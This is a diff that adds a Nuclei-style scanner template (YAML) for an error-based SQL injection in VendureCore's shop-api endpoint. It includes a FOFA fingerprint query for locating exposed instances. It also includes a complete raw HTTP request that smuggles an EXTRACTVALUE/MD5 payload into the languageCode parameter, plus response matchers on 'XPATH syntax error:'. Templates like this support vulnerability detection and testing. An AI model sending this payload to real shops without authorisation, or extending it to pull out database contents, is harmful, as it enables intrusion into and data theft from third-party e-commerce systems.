@@ -1,0 +1,31 @@
+id: vendurecore-shop-api-sql-injection
+
+info:
+  name: VendureCore shop-api SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: header="vendure-auth-token"
+    VendureCore 的 shop-api 接口存在 SQL 注入漏洞。
+  tags: VendureCore
+
+http:
+- raw:
+  - |
+    POST /shop-api?languageCode=en'+AND+EXTRACTVALUE(5202,CONCAT(0x5c,(SELECT+MD5('123'))))+AND+'ptic'%3d'ptic HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/json
+    Upgrade-Insecure-Requests: 1
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+
+    {"query":"{ product(slug: \"a\") { id name } }"}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'XPATH syntax error:'
